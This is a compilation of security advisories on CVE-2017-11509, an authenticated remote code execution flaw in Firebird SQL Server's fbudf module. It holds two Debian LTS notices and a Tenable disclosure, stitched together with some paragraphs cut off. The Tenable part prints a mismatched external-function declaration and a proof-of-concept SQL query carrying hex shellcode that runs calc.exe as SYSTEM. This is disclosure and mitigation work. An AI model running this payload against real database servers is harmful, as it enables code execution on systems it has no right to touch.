Package        : firebird2.5
Version        : 2.5.2.26540.ds4-1~deb7u4
CVE ID         : CVE-2017-11509

An authenticated remote attacker can execute arbitrary code in Firebird SQL
Server versions 2.5.7 and 3.0.2 by executing a malformed SQL statement. The
only known solution is to disable external UDF libraries from being loaded.  In
order to achieve this, the default configuration has changed to UdfAccess=None.
This will prevent the fbudf module from being loaded, but may also break other
functionality relying on modules.

For Debian 7 "Wheezy", these problems have been fixed in version
2.5.2.26540.ds4-1~deb7u4.

We recommend that you upgrade your firebird2.5 packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be

# [R1] Firebird fbudf Module Authenticated Remote Code Execution

Critical

[‚Üê View More Research Advisories](/security/research)
### Synopsis

While investigating [CVE-2017-6369](https://nvd.nist.gov/vuln/detail/CVE-2017-6369) for Firebird SQL Server, Tenable discovered an authenticated remote code execution vulnerability. The vulnerability exists because Firebird allows users to define external functions that don‚Äôt match the original definition of the entry point.

For example, the documentation for *[string2blob](https://firebirdsql.org/refdocs/langrefupd21-udf-string2blob.html)* indicates it‚Äôs [defined](https://www.firebirdsql.org/file/documentation/reference_manuals/fblangref25-en/html/fblangref25-ddl-extfunc.html#fblangref25-ddl-extfunc-declare) like this:

```

DECLARE EXTERNAL FUNCTION string2blob
   VARCHAR(300) BY DESCRIPTOR,
   BLOB RETURNS PARAMETER 2
   ENTRY_POINT 'string2blob' MODULE_NAME 'fbudf'

```

However, an authenticated user could declare a second external function that looks like this:

```

DECLARE DECLARE EXTERNAL FUNCTION a6
  VARCHAR(300) BY DESCRIPTOR,
  VARCHAR(400) BY DESCRIPTOR
  RETURNS INTEGER
  ENTRY_POINT 'string2blob' MODULE_NAME 'fbudf'

```

You can see that the original *string2blob* has a *BLOB* as the second parameter and the second definition has a *VARCHAR(400)* as the second parameter. By passing in a crafted *VARCHAR* during a query, an authenticated attacker can overwrite the *blob\_put\_segment* function pointer in the *[blobcallback struct](https://github.com/FirebirdSQL/firebird/blob/master/src/jrd/ibase.h#L184)*. *string2blob* will eventually call the overwritten function pointer which leads to remote code execution as **SYSTEM**.****

We wrote a proof of concept using the [IE8 on Win7 (x86) virtual machine](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) and Firebird SQL Server 2.5.7 32-bit release. The proof of concept pops calc.exe.

```

SQL> select a6((select x'31db648b7b308b7f0c8b7f1c8b47088b77208b3f807e0c3375f289c703783c8b577801c28b7a2001c789dd8b34af01c645813e4372656175f2817e086f63657375e98b7a2401c7668b2c6f8b7a1c01c78b7caffc01c789d9b1ff53e2fd6863616c6389e252525353535353535253ffd7' from rdb$database), (select x'11111111C8FD8503' from rdb$database)) from rdb$database;

```

### Solution

No official solution exists. However, Tenable believes that disabling external UDF libraries from being loaded mitigates this issue. In order to achieve this, edit the default configuration from *UdfAccess=Restrict* to *UdfAccess=None*. This will prevent the fbudf module from being loaded, but it will also break other functionality relying on modules.

# Debian Long Term Support

Debian Long Term Support (LTS) is a project to extend the lifetime of all Debian stable releases to (at least) 5 years. Debian LTS is not handled by the Debian Security and Release teams, but by a separate group of volunteers and companies interested in making it a success.

Thus the Debian LTS team takes over security maintenance of the various releases once the Debian Security team stops its work.

Debian LTS Advisory DLA-2824-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                      Sylvain Beucler
November 20, 2021                             <https://wiki.debian.org/LTS>

Package        : firebird3.0
Version        : 3.0.1.32609.ds4-14+deb9u1
CVE ID         : CVE-2017-11509

An authenticated remote attacker can execute arbitrary code in
Firebird, a relational database based on InterBase 6.0, by executing a
malformed SQL statement. The only known solution is to disable
external UDF libraries from being loaded. In order to achieve this,
the default configuration has changed to UdfAccess=None. This will
prevent the fbudf module from being loaded, but may also break other
functionality relying on modules.

For Debian 9 stretch, this problem has been fixed in version
3.0.1.32609.ds4-14+deb9u1.

We recommend that you upgrade your firebird3.0 packages.

For the detailed security status of firebird3.0 please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/firebird3.0>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
